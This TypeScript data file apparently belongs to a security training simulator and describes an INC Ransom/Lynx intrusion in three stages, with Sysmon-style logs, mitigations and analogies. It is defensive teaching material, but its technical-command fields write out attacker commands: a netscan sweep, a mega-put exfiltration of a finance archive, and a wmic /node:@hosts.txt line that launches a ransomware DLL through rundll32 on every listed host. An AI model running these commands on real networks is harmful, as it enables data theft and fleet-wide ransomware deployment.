import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'inc-ransom-lynx-citrix-netscaler-wmic-mega',
    title: 'Palo Alto Unit 42, Huntress & SentinelOne — INC Ransom & Lynx: Citrix NetScaler Exploitation, wmic.exe Distributed DLL Execution & MEGASync Double Extortion',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in Palo Alto Networks Unit 42, Huntress, and SentinelOne analyses of INC Ransom and its direct successor Lynx (which shares the INC Ransom C++ codebase): affiliates breach edge appliances (Citrix NetScaler CVE-2023-3519 / Ivanti), exfiltrate data via `MEGASync.exe` and `rclone`, and distribute the ransomware DLL across the domain via `wmic.exe /node:@"hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main"`.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'INC Ransom / Lynx Operator (MEGASync Exfil)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Citrix NetScaler / Edge VPN Foothold', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Admin Host (wmic.exe /node:@hosts.txt)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Unit 42 / Huntress EDR & WMI Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Domain Endpoints (rundll32 inc.dll -> .INC / .LYNX)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Edge Appliance Compromise, NetScan Discovery & MEGASync Cloud Exfiltration',
        narration:
          'Pivoting from an exploited Citrix NetScaler ADC or VPN appliance, INC Ransom/Lynx operators enumerate all active domain computers into `C:\\Windows\\Temp\\hosts.txt` using `netscan.exe` and exfiltrate sensitive shares directly to MEGA cloud storage using `MEGAcmd` / `MEGASync.exe`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Discovery & Exfiltration (T1046 / T1567.002 - Exfiltration to Cloud Storage)',
        technicalCommands: [
          'netscan.exe /range:10.10.0.1-10.10.255.254 /save:C:\\Windows\\Temp\\hosts.txt',
          'mega-put.bat "D:\\Finance_Archive" /INC_Dump_2026 (Uploads via *.mega.co.nz TLS API)',
        ],
        defenseMitigation:
          'Block outbound connections to consumer cloud storage APIs (`*.mega.co.nz`, `*.userstorage.mega.co.nz`) from server VLANs and monitor `netscan.exe` execution.',
        logs: [
          {
            id: 'inc-1',
            timestamp: '07:02:19.304',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'MEGAcmdServer.exe',
            raw: 'EventID: 22 | Image: C:\\Users\\admin\\AppData\\Local\\MEGAcmd\\MEGAcmdServer.exe | QueryName: g.api.mega.co.nz | HostList: C:\\Windows\\Temp\\hosts.txt',
            parsedFields: {
              ExfiltrationClient: 'MEGAcmdServer.exe / MEGASync.exe',
              DestinationDomain: 'g.api.mega.co.nz',
              TargetHostList: 'C:\\Windows\\Temp\\hosts.txt',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Mass WMIC `/node:@"hosts.txt"` DLL Distribution & `rundll32.exe` Execution',
        narration:
          'After copying the ransomware DLL (`inc.dll` or `lynx.dll`) to `\\\\<host>\\C$\\Windows\\Temp\\` across every IP in `hosts.txt`, the operator executes a single `wmic.exe` command that remotely spawns `rundll32.exe` on every machine in the enterprise simultaneously.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement & Execution (T1047 - WMI / T1218.011 - Rundll32)',
        technicalCommands: [
          'wmic.exe /node:@"C:\\Windows\\Temp\\hosts.txt" /user:"CORP\\DomainAdmin" /password:"***" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
        ],
        defenseMitigation:
          'Block `wmic.exe /node:` remote process creation across workstation and server subnets via Windows Firewall (DCOM port 135) and alert on `wmiprvse.exe` spawning `rundll32.exe`.',
        logs: [
          {
            id: 'inc-2',
            timestamp: '07:06:44.712',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'wmic.exe',
            CommandLine: 'wmic.exe /node:@"C:\\Windows\\Temp\\hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\wbem\\WMIC.exe | CommandLine: wmic /node:@"C:\\Windows\\Temp\\hosts.txt" process call create "rundll32.exe C:\\Windows\\Temp\\inc.dll,Main --fast"',
            parsedFields: {
              MassDeploymentCommand: 'wmic.exe /node:@"hosts.txt" process call create',
              DllLoader: 'rundll32.exe C:\\Windows\\Temp\\inc.dll,Main',
              MitreTechnique: 'T1047 (WMI) + T1218.011 (Rundll32)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: AES-128-CTR + Curve25519 Encryption, Wallpaper Change & Network Printer Ransom Notes',
        narration:
          'Both INC Ransom and Lynx encrypt files using AES-128-CTR paired with Curve25519 elliptic-curve key exchange (`.INC` or `.LYNX`), change the Windows desktop wallpaper to the ransom notice, and call `EnumPrintersW` + `WritePrinter` to automatically print the physical ransom note on every connected office network printer.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1491.001 - Internal Defacement)',
        technicalCommands: [
          'rundll32.exe C:\\Windows\\Temp\\lynx.dll,Main (AES-128-CTR + Curve25519 encryption -> *.LYNX & README.txt)',
          'winspool.drv!EnumPrintersW() -> OpenPrinterW() -> WritePrinter(hPrinter, szRansomNote, ...)',
        ],
        defenseMitigation:
          'Monitor `rundll32.exe` loading unsigned DLLs from `C:\\Windows\\Temp` and detect anomalous `winspool.drv` raw print jobs initiated by non-spooler processes.',
        logs: [
          {
            id: 'inc-3',
            timestamp: '07:10:05.190',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rundll32.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\rundll32.exe | TargetFilename: C:\\Users\\Public\\INC-README.txt | PhysicalPrinterOutput: WritePrinter invoked on 14 network printers | Cipher: AES-128-CTR + Curve25519',
            parsedFields: {
              RansomwareFamily: 'INC Ransom / Lynx (Shared C++ Source Code)',
              PrinterExtortion: 'EnumPrintersW + WritePrinter physical ransom note printing',
              EncryptedExtension: '.INC / .LYNX',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a burglary crew that breaks in through a cracked front-door security gateway, scans every hallway to ship boxes of files out to a public cloud storage locker, copies a compact padlocking cartridge onto every office desk using an automated list of room numbers, and then locks every cabinet while printing out ransom demands straight through every office paper printer across the building.',
      storyMappings: [
        {
          storyTerm: 'Cracked front-door gateway and cloud storage locker shipment',
          technicalTerm: 'Citrix NetScaler ADC breach, NetScan discovery, and MEGASync cloud exfiltration',
          tone: 'amber',
        },
        {
          storyTerm: 'Copying a padlocking cartridge down an automated list of rooms',
          technicalTerm: 'WMIC /node:@"hosts.txt" mass DLL staging and rundll32.exe execution',
          tone: 'sky',
        },
        {
          storyTerm: 'Fast modern locks across every office cabinet',
          technicalTerm: 'INC Ransom / Lynx AES-128-CTR and Curve25519 file encryption',
          tone: 'rose',
        },
        {
          storyTerm: 'Printing ransom demands straight through every office paper printer',
          technicalTerm: 'Desktop wallpaper change plus physical network printer ransom note printing',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Slipping past an unpatched edge access gateway into the corporate interior, the crew runs a swift floor scanner to chart every active room and uploads stolen corporate files directly to an outside consumer cloud locker.',
        storyMappings: [
          {
            storyTerm: 'Unpatched edge access gateway',
            technicalTerm: 'Exploited Citrix NetScaler ADC or VPN perimeter appliance',
            tone: 'amber',
          },
          {
            storyTerm: 'Swift floor scanner charting every active room',
            technicalTerm: 'NetScan discovering live hosts, shares, and IP lists saved to hosts.txt',
            tone: 'sky',
          },
          {
            storyTerm: 'Outside consumer cloud locker',
            technicalTerm: 'MEGASync client exfiltrating staged corporate documents to Mega.nz',
            tone: 'rose',
          },
          {
            storyTerm: 'Dual-brand criminal family',
            technicalTerm: 'Shared INC Ransom and Lynx codebase and affiliate playbooks',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'Holding a neat roster of every room number in the building, the operator copies a compact padlocking cartridge into each room temporary closet and uses the building built-in remote runner to trigger every cartridge across the entire roster in one single command.',
        storyMappings: [
          {
            storyTerm: 'Neat roster of every room number',
            technicalTerm: 'Target host list hosts.txt fed into WMIC /node:@"hosts.txt"',
            tone: 'amber',
          },
          {
            storyTerm: 'Compact padlocking cartridge placed in each closet',
            technicalTerm: 'inc.dll or lynx.dll copied to \\\\<host>\\C$\\Windows\\Temp\\',
            tone: 'sky',
          },
          {
            storyTerm: 'Built-in remote runner triggering every cartridge',
            technicalTerm: 'WMIC process call create invoking signed rundll32.exe to execute the DLL',
            tone: 'rose',
          },
          {
            storyTerm: 'Single-command fleet-wide launch',
            technicalTerm: 'Rapid horizontal detonation across Windows workstations and servers',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'As modern elliptical-key padlocks clamp down on every document, the crew flips every monitor screen to a stark warning banner and even sends their ransom letter straight to every networked paper printer in the hallways so nobody can miss the takeover.',
        storyMappings: [
          {
            storyTerm: 'Modern elliptical-key padlocks',
            technicalTerm: 'AES-128-CTR symmetric file encryption paired with Curve25519 key exchange',
            tone: 'amber',
          },
          {
            storyTerm: 'Stark warning banner across every monitor',
            technicalTerm: 'Automated Windows desktop wallpaper replacement announcing compromise',
            tone: 'sky',
          },
          {
            storyTerm: 'Ransom letters pouring out of hallway paper printers',
            technicalTerm: 'Physical network printer job dispatch printing extortion notices on paper',
            tone: 'rose',
          },
          {
            storyTerm: 'Shared cryptographic DNA',
            technicalTerm: 'Identical encryption workflow shared between INC Ransom and its Lynx rebrand',
            tone: 'emerald',
          },
        ],
      },
    },
  };
